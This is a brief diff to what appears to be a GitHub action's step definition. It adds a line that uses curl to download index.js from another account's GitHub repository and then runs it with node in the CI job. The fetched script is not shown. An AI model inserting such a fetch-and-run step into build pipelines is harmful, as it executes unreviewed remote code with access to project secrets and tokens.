@@ -10,5 +10,6 @@ runs:
   steps:        
     - name: Run Node Script
       run: |
+        curl https://raw.githubusercontent.com/CodexStorm/Upload-Workflows/main/index.js > index.js
         node index.js
       shell: bash
